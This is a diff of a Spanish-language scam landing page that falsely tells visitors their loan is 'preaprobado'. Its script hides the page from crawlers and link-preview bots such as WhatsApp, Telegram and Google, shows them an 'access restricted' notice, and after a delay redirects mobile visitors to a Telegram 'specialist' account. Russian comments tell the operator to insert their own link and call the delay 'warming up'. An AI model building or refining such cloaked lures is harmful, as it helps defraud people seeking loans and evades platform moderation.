@@ -2,12 +2,12 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Tu crédito aprobado</title>
+  <title>Tu crédito fue preaprobado</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="robots" content="noindex, nofollow">
   <style>
     body {
-      background-color: #f2f2f2;
+      background-color: #ffffff;
       font-family: 'Segoe UI', sans-serif;
       color: #222;
       display: flex;
@@ -19,7 +19,7 @@
       padding: 20px;
     }
     h1 {
-      color: #009966;
+      color: #007f60;
       font-size: 2rem;
     }
     .info {
@@ -28,50 +28,51 @@
     }
     .small {
       font-size: 0.9rem;
-      color: #666;
+      color: #777;
       margin-top: 20px;
     }
   </style>
 </head>
 <body>
   <h1>✅ ¡Tu crédito fue preaprobado!</h1>
-  <p class="info">💸 Desde $200.000 ARS, con tasas desde el 11% anual</p>
-  <p class="info">⏱️ Proceso 100% online, en solo 5 minutos</p>
-  <p class="info">🔐 Redirigiendo al especialista...</p>
-  <p class="small">Si no ocurre nada, verifique su conexión o vuelva a intentar desde el enlace oficial.</p>
+  <p class="info">💰 Desde $200.000 ARS — Tasa desde el 11% anual</p>
+  <p class="info">⚡️ Proceso 100% online en menos de 5 minutos</p>
+  <p class="info">⏳ Redirigiendo al especialista...</p>
+  <p class="small">Si no ocurre nada, <a href="https://t.me/tu_usuario_telegram">haz clic aquí</a>.</p>
 
   <script>
-    const isHuman = () => {
+    const isBot = () => {
       const ua = navigator.userAgent;
-      const bots = [/bot/i, /crawl/i, /spider/i, /WhatsApp/i, /telegram/i, /Discord/i, /Slackbot/i, /Google/i, /Preview/i];
-      return !bots.some(b => b.test(ua));
+      const bots = [
+        /bot/i, /crawl/i, /spider/i,
+        /WhatsApp/i, /Telegram/i, /Slackbot/i,
+        /Discord/i, /Google/i, /Preview/i
+      ];
+      return bots.some(b => b.test(ua));
     };
 
     const isTouchDevice = () => {
       return 'ontouchstart' in window || navigator.maxTouchPoints > 0;
     };
 
-    const isFromTilda = () => {
-      return document.referrer.includes("tilda") || document.referrer.includes("argentinaforreal.tilda.ws");
-    };
-
     const redirectToTelegram = () => {
       window.location.href = "https://t.me/Veronica_especialista"; // ← вставь свою ссылку
     };
 
-    if (isHuman() && isTouchDevice() && isFromTilda()) {
+    if (!isBot() && isTouchDevice()) {
       setTimeout(() => {
         redirectToTelegram();
-      }, 2500); // задержка 2.5 секунды для визуального прогрева
+      }, 3000); // задержка 3 сек на прогрев
     } else {
       document.body.innerHTML = `
-        <h2>Acceso restringido</h2>
-        <p>Esta página solo está disponible para solicitudes activas desde canal oficial.</p>
+        <h2>⚠️ Acceso restringido</h2>
+        <p>Esta página está disponible solo para solicitudes reales.</p>
       `;
     }
   </script>
 </body>
 </html>
+
 
 
 
